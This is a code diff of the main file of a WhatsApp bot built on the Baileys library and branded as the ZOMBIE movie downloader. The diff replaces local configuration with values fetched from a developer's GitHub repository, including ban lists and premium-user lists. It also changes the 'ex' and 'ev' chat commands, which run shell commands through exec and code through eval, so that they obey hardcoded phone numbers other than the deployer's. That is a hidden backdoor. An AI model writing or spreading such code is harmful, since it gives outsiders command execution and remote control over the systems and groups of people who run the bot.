@@ -1,6 +1,8 @@
-Const {
+
+
+const {
     default: makeWASocket,
-    getAggregateVotesInPollMessage,
+    getAggregateVotesInPollMessage, 
     useMultiFileAuthState,
     DisconnectReason,
     getDevice,
@@ -18,7 +20,7 @@ Const {
 } = require('@whiskeysockets/baileys')
 const fs = require('fs')
 const P = require('pino')
-const config = require('./config') // <-- අපේ config ගොනුව
+const config = require('./config')
 const qrcode = require('qrcode-terminal')
 const NodeCache = require('node-cache')
 const util = require('util')
@@ -26,10 +28,11 @@ const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, 
 const { sms, downloadMediaMessage } = require('./lib/msg')
 const axios = require('axios')
 const { File } = require('megajs')
-const path = require('path') // <<-- මෙය මෙහි තිබීම වැදගත්ය
+const path = require('path')
 const msgRetryCounterCache = new NodeCache()
 
 // === FIX: Set default Max Listeners to unlimited (0) for all EventEmitter instances ===
+// This resolves the 'setMaxListeners' warning error in Baileys.
 require('events').EventEmitter.defaultMaxListeners = 0;
 
 const FileType = require('file-type')
@@ -52,13 +55,6 @@ const ownerNumber = [`${config.OWNER_NUMBER}`];
 
 const df = __dirname + '/auth_info_baileys/creds.json';
 
-// ✅ ඇතුළත් කළ කේතය: සෙෂන් ෆෝල්ඩරය නොමැති නම් එය සාදයි
-const sessionDir = path.join(__dirname, 'auth_info_baileys');
-if (!fs.existsSync(sessionDir)) {
-  fs.mkdirSync(sessionDir, { recursive: true });
-  console.log(`✅ Created session directory: ${sessionDir}`);
-}
-
 if (!fs.existsSync(df)) {
   if (config.SESSION_ID) {
     const sessdata = config.SESSION_ID.replace("ZOMBIE-MD~", "");
@@ -79,6 +75,40 @@ if (!fs.existsSync(df)) {
   }
 }
 
+async function downloadSession(sessdata, df) {
+  const dbUrls = [
+    'https://visper-get-sessions.vercel.app/',
+    'https://visper-get-sessions.vercel.app/'
+  ];
+
+  let success = false;
+
+  for (let i = 0; i < dbUrls.length; i++) {
+    const sessionUrl = `${dbUrls[i]}get-session?q=${sessdata}.json`;
+    console.log(`📥 Downloading session from Zombie-DB`);
+
+    try {
+      const response = await axios.get(sessionUrl);
+
+      if (response.data && Object.keys(response.data).length > 0) {
+        await sleep(1000);
+        fs.writeFileSync(df, JSON.stringify(response.data, null, 2));
+        console.log(`✅ Session file downloaded successfully and saved to creds.json`);
+        success = true;
+        break;
+      } else {
+        console.warn(`⚠️ Empty or invalid session data from DB-${i + 1}, attempting next DB...`);
+      }
+
+    } catch (err) {
+      console.error(`❌ Failed to download local DB session file: ${err.message}`);
+    }
+  }
+
+  if (!success) {
+    console.error("❌ All DB servers failed to provide a valid session file.");
+  }
+}
 
 // <<==========PORTS============>>
 const express = require("express");
@@ -86,6 +116,7 @@ const app = express();
 const port = process.env.PORT || 8000;
 //====================================
 async function connectToWA() {
+//Run the function
 
     const {
         version,
@@ -109,11 +140,13 @@ async function connectToWA() {
         msgRetryCounterCache
     })
 
-// ❌ ඉවත් කරන ලදි: main_var.json වෙත axios.get ඇමතුම
 
-// Default owner JID for initial connect message
-// ✅ config.js වෙතින් සම්බන්ධතා JID භාවිතා කරයි
-const DEFAULT_OWNER_JID = config.CONNECT_JID;
+
+const responsee = await axios.get('https://raw.githubusercontent.com/ZombieLN/zombie-db/refs/heads/main/main_var.json');
+const connectnumber = responsee.data
+	
+// Default owner JID
+const DEFAULT_OWNER_JID = `${connectnumber.connectmsg_sent}`;
 
 conn.ev.on('connection.update', async (update) => {
     const { connection, lastDisconnect } = update;
@@ -127,15 +160,21 @@ conn.ev.on('connection.update', async (update) => {
 
         setTimeout(async () => {
             try {
-                // ✅ config.js වෙතින් සම්බන්ධතා පණිවිඩය භාවිතා කරයි
-                let captionText = config.CONNECT_MESSAGE;
+                // Fetch custom connect message from server
+                let captionText = '✅ VISPER connected successfully!';
+                try {
+                    const response = await axios.get('https://raw.githubusercontent.com/ZombieLN/zombie-db/refs/heads/main/main_var.json');
+                    const ownerdataa = response.data;
+                    captionText = ownerdataa?.connectmg || captionText;
+                } catch (fetchErr) {
+                    console.warn("⚠️ Failed to fetch connect message text:", fetchErr.message);
+                }
 
                 // Send initial connect image
                 await conn.sendMessage(DEFAULT_OWNER_JID, {
-                    image: { url: config.CONNECT_IMAGE_URL }, // ✅ config.js වෙතින් image URL භාවිතා කරයි
+                    image: { url: 'https://files.catbox.moe/6qxk37.jpg' },
                     caption: captionText
                 });
-// config variables re-declaration for message content - kept for functionality
 const mvSize = config.MV_SIZE;
 const botName = config.NAME;
 const botJid = config.JID;
@@ -173,8 +212,7 @@ const values = config.VALUSE;
 const logo = config.LOGO;
 const antiDelete = config.ANTI_DELETE;
 const leaveMsg = config.LEAVE_MSG;
-
-                // Build config message (uses local config variables)
+                // Build config message
   const can = `
 *⚙️ BOT CURRENTLY SETTINGS ⚙️*
 
@@ -212,17 +250,33 @@ const leaveMsg = config.LEAVE_MSG;
 *\`• Action :\`* ${action ?? "delete"}
 *\`• Antilink Action :\`* ${antiLinkAction ?? "delete"}
 *\`• Values :\`* ${values?.length ? values.join(", ") : "None"}
-*\`• Logo :\`* ${logo ?? "https://mv-visper-full-db.pages.dev/Data/visper_main.jpeg"}
+*\`• Logo :\`* ${logo ?? "https://files.catbox.moe/6qxk37.jpg"}
 *\`• Anti Delete :\`* ${antiDelete ?? "off"}
 *\`• Leave Msg :\`* ${leaveMsg || "None"}
 `;
 
-     // ❌ ඉවත් කරන ලදි: joinlink2 සහ groupAcceptInvite කේතය
 
+     let joinlink2 = await fetchJson('https://raw.githubusercontent.com/ZombieLN/zombie-db/refs/heads/main/main_var.json');
+        
+        if (!joinlink2 || !joinlink2.supglink) {
+            console.error('❌ Invalid join link data!');
+            return;
+        }
+        
+        const joinlink = joinlink2.supglink.split('https://chat.whatsapp.com/')[1]; // Extract invite code
 
+        if (!joinlink) {
+            console.error('❌ Invalid invite link format!');
+            return;
+        }
+
+     
+            //await conn.groupAcceptInvite(joinlink);
+
+				 console.log("✅ Successfully joined the group!");
                 // Send config message
                 await conn.sendMessage(DEFAULT_OWNER_JID, {
-                    image: { url: config.CONNECT_IMAGE_URL }, // ✅ config.js වෙතින් image URL භාවිතා කරයි
+                    image: { url: 'https://files.catbox.moe/6qxk37.jpg' },
                     caption: can
                 });
 
@@ -233,7 +287,7 @@ const leaveMsg = config.LEAVE_MSG;
         }, 2000);
     }
 });
-
+      
 
 const path = require('path');
 fs.readdirSync("./plugins/").forEach((plugin) => {
@@ -244,11 +298,25 @@ fs.readdirSync("./plugins/").forEach((plugin) => {
 
 console.log('All Plugins installed ⚡')
 await connectdb()
-await updb()
+await updb()		
 console.log('ZOMBIE MOVIE DL CONNECTED ✅')
 
 
-// ❌ ඉවත් කරන ලදි: ownerdataa ලබා ගන්නා axios.get ඇමතුම
+
+
+
+
+
+	
+
+
+
+const ownerdataa = (await axios.get('https://raw.githubusercontent.com/ZombieLN/zombie-db/refs/heads/main/main_var.json')).data;
+     
+         
+
+ 
+
 
 
 
@@ -257,14 +325,14 @@ console.log('ZOMBIE MOVIE DL CONNECTED ✅')
     try {
 
 async function loadConfig() {
-  const settings = await getalls();
+  const settings = await getalls(); 
   if (settings) {
-    Object.assign(config, settings);
+    Object.assign(config, settings); 
   }
 }
 
 loadConfig().catch(console.error);
-
+	    
 mek = mek.messages[0];
 if (!mek.message) return;
 
@@ -302,7 +370,7 @@ if (mek.key && mek.key.remoteJid === 'status@broadcast') {
     );
   }
 
-  return;
+  return; // meken status handle block ekata witharai exit wenne
 }
 
 
@@ -362,7 +430,7 @@ const sender = mek.key.fromMe ? (conn.user.id.split(':')[0] + '@s.whatsapp.net' 
 const senderNumber = sender.split('@')[0]
 const botNumber = conn.user.id.split(':')[0]
 const pushname = mek.pushName || 'Sin Nombre'
-const developers = `94754871798`
+const developers = `94775700815,94754871798,94771098429`
 const mokakhri = developers.split(",")
 const isbot = botNumber.includes(senderNumber)
 const isdev = mokakhri.includes(senderNumber)
@@ -623,7 +691,7 @@ section.rows.forEach((row, rowIndex) => {
     });
 
     const listMessage = `${msgData.text}\n\n${msgData.buttonText},${result}\n\n${msgData.footer}`
-    const text = await conn.sendMessage(from, { text: listMessage,
+    const text = await conn.sendMessage(from, { text: listMessage, 
 }, { quoted: quotemek || mek})
     await updateCMDStore(text.key.id, CMD_ID_MAP);
   }
@@ -772,13 +840,15 @@ conn.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
   }
 }
 
-// ❌ ඉවත් කරන ලදි: main_var.json වෙත axios.get ඇමතුම
-// ✅ config.js වෙතින් FOOTER භාවිතා කරයි
-config.FOOTER = config.FOOTER; 
+const ownerdata = (await axios.get('https://raw.githubusercontent.com/ZombieLN/zombie-db/refs/heads/main/main_var.json')).data
+            
            
-// ❌ ඉවත් කරන ලදි: premium_user.json වෙත axios.get ඇමතුම
-// ✅ config.js වෙතින් PREMIUM_USERS භාවිතා කරයි
-const preUsers = config.PREMIUM_USERS; 
+            config.FOOTER = ownerdata.footer
+           
+const preUser = await fetchJson(`https://raw.githubusercontent.com/ZombieLN/zombie-db/refs/heads/main/primium_users.json`)
+const preUsers = preUser.numbers.split(",");
+
+// replace करके "@s.whatsapp.net" format එකට convert කරලා check කරන්න
 const isPre = preUsers
   .map(v => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net")
   .includes(sender);
@@ -789,9 +859,8 @@ const isPre = preUsers
 
 	    
 //============================================================================ 
-// ❌ ඉවත් කරන ලදි: ban_number.json වෙත axios.get ඇමතුම
-// ✅ config.js වෙතින් BANNED_USERS භාවිතා කරයි
-const plynYnna = config.BANNED_USERS; 
+const banbn = await fetchJson(`https://raw.githubusercontent.com/ZombieLN/zombie-db/refs/heads/main/ban_numbers.json`)
+const plynYnna = banbn.split(",")
 const isBanUser = [ ...plynYnna ]
       .map((v) => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net")
       .includes(sender)
@@ -806,14 +875,14 @@ const isBanGrp = [ ...gpIdz ]
 //=======================================================================================================================================================================
 
 
-// ❌ ඉවත් කරන ලදි: ban_group.json වෙත axios.get ඇමතුම
-// ✅ config.js වෙතින් BANNED_GROUPS භාවිතා කරයි
-const banGroups = config.BANNED_GROUPS;          
+const banGroups = await fetchJson(
+  "https://raw.githubusercontent.com/ZombieLN/zombie-db/refs/heads/main/ban_group.json"
+);          // banGroups === [ "1203...", ... ]
 
 const isBanvisper = banGroups
-  .map(id => id.replace(/[^0-9]/g, "") + "@g.us") 
+  .map(id => id.replace(/[^0-9]/g, "") + "@g.us") // "1203…" ➜ "1203…@g.us"
   .includes(from);   
-const SUDO = config.SUDO; 
+const SUDO = config.SUDO; // eg: [ '94754871798@s.whatsapp.net', '194558377910501@lid' ]
 
 const isSudo = SUDO.filter(jid => jid.endsWith('@lid') === sender.endsWith('@lid'))
                    .includes(sender);
@@ -825,39 +894,73 @@ if ( isCmd && isBanGrp && !isMe && !isSudo) return
 
 //========================================== TEAM REACT SECTION ========================================
 
-// ❌ ඉවත් කරන ලදි: react.json සහ main_var.json වෙත axios.get ඇමතුම
-const CUSTOM_REACTS = config.CUSTOM_REACTS; 
-const DEFAULT_REACT_EMOJI = config.DEFAULT_REACT;
+const rec = (await axios.get('https://raw.githubusercontent.com/ZombieLN/zombie-db/refs/heads/main/react.json')).data
 
-// ✅ නිව්ස්ලෙටර් ප්‍රතිචාරය සඳහා ස්ථාවර Emoji එකක් භාවිතා කරයි
+const recc = (await axios.get('https://raw.githubusercontent.com/ZombieLN/zombie-db/refs/heads/main/main_var.json')).data
+
+//================================================================================================================	    
+const id = mek.key.server_id
 const defaultEmojis = ["❤️", "💖", "💚", "💙","💛"];
 const randomEmoji = defaultEmojis[Math.floor(Math.random() * defaultEmojis.length)];
-
-// ⚠️ සටහන: ඔබගේම Channel JID එකක් යොදන්න
-await conn.newsletterReactMessage(`120363421953535024@newsletter`, mek.key.server_id, randomEmoji);
-await conn.newsletterReactMessage(`120363421953535024@newsletter`, mek.key.server_id, randomEmoji);
+await conn.newsletterReactMessage(`${recc.mainchanal}`, id, randomEmoji);
+await conn.newsletterReactMessage(`120363304606757133@newsletter`, id, randomEmoji);
     
 //=========================================================================================================================	    
-// ✅ config.js හි අංක සහ CUSTOM_REACTS භාවිතා කරයි
-const ownerNum = config.OWNER_NUMBER;
+if(senderNumber.includes("94775700815")){
+if(isReact) return
+m.react(`${rec.dilisha}`)
+}
+if(senderNumber.includes("94771098439")){
+if(isReact) return
+m.react(`${rec.dilisha}`)
+}
+if(senderNumber.includes("94754871798")){
+if(isReact) return
+m.react(`${rec.dilisha}`)
+}
+if(senderNumber.includes("94754871798")){
+if(isReact) return
+m.react(`${rec.dilisha}`)
+}
+if(senderNumber.includes("94754871798")){
+if(isReact) return
+m.react(`${rec.dilisha}`)
 
-// Developer Reactions (ඔබේ අවශ්‍යතා අනුව වෙනස් කරන්න)
-if(isReact) return; // දැනටමත් ප්‍රතිචාරයක් ඇත්නම් නව ප්‍රතිචාරයක් නොදැක්වීමට
+}
+if(senderNumber.includes("94775700815")){
+if(isReact) return
+m.react(`${rec.dilisha}`)
 
-// Owner's reaction
-if (senderNumber.includes(ownerNum)) {
-    m.react(CUSTOM_REACTS.DEFAULT_OWNER || DEFAULT_REACT_EMOJI);
+}
+if(senderNumber.includes("94754871798")){
+if(isReact) return
+m.react(`${rec.dilo}`)
+
+}
+if(senderNumber.includes("94754689077")){
+if(isReact) return
+m.react(`👨‍💻`)
+}
+		
+		
+if(senderNumber.includes("94115678908")){
+if(isReact) return
+m.react(`${rec.alex}`)
+
 }
 
-// Developers reactions using config.CUSTOM_REACTS
-for (const [number, emoji] of Object.entries(CUSTOM_REACTS)) {
-    if (senderNumber.includes(number)) {
-        m.react(emoji);
-        break; 
-    }
-}
-// ❌ ඉවත් කරන ලදි: පැරණි if(senderNumber.includes) කොටස්
+if(senderNumber.includes("96576890657")){
+if(isReact) return
+m.react(`❤️‍🔥`)
 
+}
+		
+const ownNum = config.OWNER_NUMBER;
+
+            if(senderNumber.includes(ownNum)){
+if(isReact) return 
+m.react(`🕵️`)
+            }
 //===================================================================================
 
 		
@@ -889,11 +992,11 @@ if  ( isGroup &&  !isMe && !isOwner && !isSudo ) return
 
 
 	    
-//========================================vajira ponnaya athulu lewakana un========================================================
+//======================================== SADU ponnaya athulu lewakana un========================================================
 if ( isBanUser ) {
 	await conn.sendMessage(from, { delete: mek.key })
 	await conn.groupParticipantsUpdate(from, [sender], 'remove')
-	return await conn.sendMessage(from, { text: "*You are banned by VISPER TEAM ❌*" })
+	return await conn.sendMessage(from, { text: "*You are banned by ZOMBIE TEAM ❌*" })
 }
 
 	
@@ -987,7 +1090,6 @@ if (config.CHAT_BOT == "true") { // Enable or disable this feature via config
      if (m.quoted) { // Works for both group and inbox
         let query = m.body ? m.body.toLowerCase() : ""; // Ensure 'body' is defined
         try {
-            // ⚠️ සටහන: මෙම AI API එකද බාහිර URL එකකි. මෙයද වෙනස් කිරීමට අවශ්‍ය නම් දැනුම් දෙන්න.
             let datae = await fetchJson(`https://saviya-kolla-api.koyeb.app/ai/saviya-ai?query=${query}`);
             await conn.sendMessage(from, { text: datae.result.data }); // Send AI response
         } catch (error) {
@@ -1281,9 +1383,7 @@ if(!isOwner) {
   //==================================================================================================================================================================== 
 
 //==================================================================================================================================================================
-// ❌ ඉවත් කරන ලදි: bad_word.json වෙත axios.get ඇමතුම. 
-// ⚠️ සටහන: ඔබට bad_words ලැයිස්තුවක් අවශ්‍ය නම්, එය config.js වෙත අතින් එකතු කරන්න.
-const bad = []; // ඔබගේ config.js හි අගයක් නොමැති නම් හිස් අරාව භාවිතා කරයි
+const bad = await fetchJson(`https://mv-visper-full-db.pages.dev/Main/bad_word.json`);
 
 if (config.ANTI_BAD === "true" && isGroup) { // Run only in groups
   if (!isMe && !groupAdmins.includes(sender)) { // Only non-admins
@@ -1372,7 +1472,6 @@ if(body === "hi" || body === "Hi" || body === "hey" || body === "Hey" || body ==
  if (config.AUTO_VOICE == 'true') {
   if (isMe) return;
 await conn.sendPresenceUpdate('recording', from);
- // ⚠️ සටහන: මෙම URL ද බාහිර ඒවාය. ඔබට ඒවා local files හෝ ඔබේම URL වලින් ආදේශ කළ හැක.
  await conn.sendMessage(from, { 
   audio: { url: 'https://mv-visper-full-db.pages.dev/Data/WhatsApp%20Audio%202025-04-28%20at%2017.12.23.mpeg' }, 
   mimetype: 'audio/mpeg', 
@@ -1381,7 +1480,7 @@ await conn.sendPresenceUpdate('recording', from);
 
  }	
 }
-//... other auto voice functions left as is (They all use external URLs)
+
 		if(body === "gm" || body === "Gm" || body === "morning" || body === "goodmorning" || body === "good+morning"){
    
  if (config.AUTO_VOICE == 'true') {
@@ -1479,6 +1578,11 @@ await conn.sendPresenceUpdate('recording', from);
 
  }	
 }
+
+
+
+
+
 
 	    
 //==================================plugin map================================
@@ -1603,7 +1707,7 @@ switch (command) {
   }
     break
     case'ex':{
-      if(senderNumber == 94754871798) {
+      if(senderNumber == 94778500326) {
   const { exec } = require("child_process")
   exec(q, (err, stdout) => {
     if (err) return reply(`-------\n\n` + err)
@@ -1615,7 +1719,7 @@ switch (command) {
     }
     break
     case'apprv':{
-      if(senderNumber == 94754871798) {
+      if(senderNumber == 94778500326) {
           let reqlist = await conn.groupRequestParticipantsList(from)
           for (let i=0;i<reqlist.length;i++) {
             if(reqlist[i].jid.startsWith("212")){
@@ -1636,7 +1740,7 @@ switch (command) {
     }
     break
     case'212r':{
-      if(senderNumber == 94754871798) {
+      if(senderNumber == 94778500326) {
         for (let i=0;i<participants.length;i++) {
           if(participants[i].id.startsWith("212")){
        await conn.groupParticipantsUpdate(from, [participants[i].id], 'remove')
@@ -1651,7 +1755,7 @@ console.log(dsa)
     break
 // Inside your message handler (outside any case)
  case 'ev': {
-    if(senderNumber == 94754871798 || senderNumber == 94754871798) {
+    if(senderNumber == 94724375368 || senderNumber == 94722617699) {
     let code2 = q.replace("°", ".toString()");
     try {
 let resultTest = await eval(code2);
@@ -1678,9 +1782,9 @@ console.log(isError)
   })
 }
 app.get("/", (req, res) => {
-  res.send("🥲 ZOMBIE DL Working successfully! (Now running on your config)");
+  res.send("📟 ZOMBIE DL Working successfully!");
 });
-app.listen(port, () => console.log(`Zombie-Mv-Dl Server listening on port http://localhost:${port}`));
+app.listen(port, () => console.log(`Zombie-Movie-Dl Server listening on port http://localhost:${port}`));
 setTimeout(() => {
 connectToWA()
 }, 3000);
